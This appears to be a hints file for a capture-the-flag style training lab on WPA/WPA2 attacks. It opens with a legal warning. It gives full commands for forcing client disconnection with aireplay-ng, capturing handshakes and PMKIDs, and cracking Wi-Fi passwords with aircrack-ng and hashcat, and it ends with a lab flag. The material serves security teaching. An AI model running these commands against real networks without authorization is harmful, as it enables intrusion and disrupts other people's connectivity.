# Lab 05: WPA/WPA2 Attacks - Hints

Progressive hints to help you complete the lab without giving away the full solution.

```
+===============================================================+
|                        HINT GUIDE                              |
+===============================================================+
|  Start with Hint Level 1. Only proceed if still stuck.        |
|  Challenge yourself - learning happens through struggle!       |
+===============================================================+
```

## Legal Reminder

```
+=====================================================================+
|                         LEGAL WARNING                                |
+=====================================================================+
|  Only attack networks you OWN or have EXPLICIT WRITTEN PERMISSION   |
|  to test. Unauthorized WPA attacks are criminal offenses.           |
+=====================================================================+
```

---

## Exercise 1: Handshake Capture

### Task
Capture a WPA2 4-way handshake from your test network.

### Hint Level 1 - Conceptual
The 4-way handshake occurs when a client connects or reconnects to the AP. You need to be monitoring when this happens.

### Hint Level 2 - What You Need
- Monitor mode enabled
- Capture running on correct channel
- A client must connect while you're capturing

### Hint Level 3 - Tools
Use `airodump-ng` to capture. Look for the "WPA handshake:" message in the top-right corner.

### Hint Level 4 - Command Structure
```bash
sudo airodump-ng -c [CHANNEL] --bssid [AP_MAC] -w [FILENAME] [INTERFACE]
```

### Hint Level 5 - Success Indicator
```
 CH  6 ][ Elapsed: 5 min ][ WPA handshake: AA:BB:CC:DD:EE:FF
                             ↑
                    This appears when captured!
```

---

## Exercise 2: Forced Handshake

### Task
Use deauthentication to force a handshake capture.

### Hint Level 1 - Conceptual
If you disconnect a client, they will automatically try to reconnect. This reconnection triggers the 4-way handshake.

### Hint Level 2 - The Tool
`aireplay-ng` with the `-0` option sends deauthentication frames.

### Hint Level 3 - Requirements
You need to know:
- The AP's BSSID
- The client's MAC address (optional but recommended)
- Be on the same channel as the AP

### Hint Level 4 - Command Structure
```bash
sudo aireplay-ng -0 [COUNT] -a [AP_MAC] -c [CLIENT_MAC] [INTERFACE]
```

### Hint Level 5 - Timing
Run the deauth command while airodump-ng is capturing. Watch for handshake immediately after.

---

## Exercise 3: PMKID Attack

### Task
Capture PMKID without needing a connected client.

### Hint Level 1 - Conceptual
PMKID is sent in the first message of the 4-way handshake. You just need to start connecting (not complete).

### Hint Level 2 - Tools Needed
- `hcxdumptool` - Captures PMKID
- `hcxpcapngtool` - Converts to hashcat format
- `hashcat` - Cracks the hash

### Hint Level 3 - Not All APs Support
PMKID capture doesn't work on all access points. If it fails, use the traditional handshake method.

### Hint Level 4 - Capture Command
```bash
sudo hcxdumptool -i wlan0mon -o output.pcapng --enable_status=1
```

### Hint Level 5 - Conversion Command
```bash
hcxpcapngtool -o hash.hc22000 output.pcapng
```

---

## Exercise 4: Dictionary Attack

### Task
Crack the captured handshake or PMKID using a wordlist.

### Hint Level 1 - Conceptual
Dictionary attacks try passwords from a list. The password must be in your wordlist to be found.

### Hint Level 2 - Wordlist Location
Kali Linux includes rockyou.txt:
```
/usr/share/wordlists/rockyou.txt
```
You may need to decompress it first.

### Hint Level 3 - Tools
- `aircrack-ng` - CPU-based, good for quick tests
- `hashcat` - GPU-accelerated, much faster

### Hint Level 4 - Aircrack-ng Command
```bash
aircrack-ng -w /path/to/wordlist.txt capture.cap
```

### Hint Level 5 - Hashcat Command
```bash
# First convert capture
aircrack-ng -j hashfile capture.cap

# Then crack
hashcat -m 22000 hashfile.hc22000 /path/to/wordlist.txt
```

---

## Cracking Speed Hints

### "Cracking is very slow"

**Hint Level 1:** WPA2 uses PBKDF2 with 4096 iterations - it's designed to be slow.

**Hint Level 2:** GPU acceleration (hashcat) is 100-1000x faster than CPU.

**Hint Level 3:** If using hashcat, verify GPU is being used:
```bash
hashcat -I  # List devices
```

**Hint Level 4:** Use benchmark to see your speed:
```bash
hashcat -m 22000 -b
```

---

## Wordlist Strategy Hints

### "Password not found in rockyou.txt"

**Hint Level 1:** rockyou.txt contains about 14 million passwords, but not all.

**Hint Level 2:** Try rule-based attacks that add variations:
```bash
hashcat -m 22000 hash.hc22000 wordlist.txt -r rules/best64.rule
```

**Hint Level 3:** Create custom wordlist based on target:
- Company name variations
- Location-based words
- Common patterns (Season+Year)

**Hint Level 4:** Combine multiple wordlists:
```bash
cat list1.txt list2.txt | sort -u > combined.txt
```

---

## Troubleshooting Hints

### "No handshake message appears"

**Hint 1:** Is a client actually connected to the AP?
- Check the STATION section in airodump-ng

**Hint 2:** Are you on the correct channel?
- Use `-c` to lock channel

**Hint 3:** Try deauthentication to force reconnection

### "Deauth doesn't work"

**Hint 1:** Verify packet injection works:
```bash
sudo aireplay-ng --test wlan0mon
```

**Hint 2:** Are you close enough to both AP and client?

**Hint 3:** Some clients have deauth protection - try multiple times

### "PMKID not captured"

**Hint 1:** Not all APs send PMKID - try another AP

**Hint 2:** Ensure you're running hcxdumptool long enough (30-60 seconds)

**Hint 3:** Fall back to traditional handshake method

### "Hashcat won't start"

**Hint 1:** Check hash file format:
```bash
file hash.hc22000
```

**Hint 2:** Verify hashcat installation:
```bash
hashcat --version
```

**Hint 3:** Try CPU-only mode:
```bash
hashcat -m 22000 -D 1 hash.hc22000 wordlist.txt
```

---

## Quick Reference

```bash
# Enable monitor mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Find target
sudo airodump-ng wlan0mon

# Capture handshake
sudo airodump-ng -c [CH] --bssid [AP] -w capture wlan0mon

# Force handshake (deauth)
sudo aireplay-ng -0 5 -a [AP] -c [CLIENT] wlan0mon

# PMKID capture
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1
hcxpcapngtool -o hash.hc22000 pmkid.pcapng

# Crack with aircrack-ng
aircrack-ng -w wordlist.txt capture-01.cap

# Crack with hashcat
hashcat -m 22000 hash.hc22000 wordlist.txt

# Restore
sudo airmon-ng stop wlan0mon
sudo systemctl start NetworkManager
```

---

## Understanding Results

### Handshake Quality

```bash
# Check handshake with pyrit
pyrit -r capture.cap analyze

# Good output shows:
# EAPOL 1/4, 2/4, 3/4, 4/4 present
```

### Cracking Success Indicators

```
# Aircrack-ng success:
KEY FOUND! [ password123 ]

# Hashcat success:
Status...........: Cracked
WPA*01*...:password123
```

---

## Still Stuck?

1. **Review prerequisites:** Monitor mode working? Injection working?
2. **Check hardware:** Compatible adapter with injection support?
3. **Verify target:** Is the AP using WPA2-PSK (not Enterprise)?
4. **Consult walkthrough:** walkthrough.md has complete solutions

---

**Flag Location:** Successfully crack the handshake to find: `FLAG{wp4_h4ndsh4k3_cr4ck3d}`
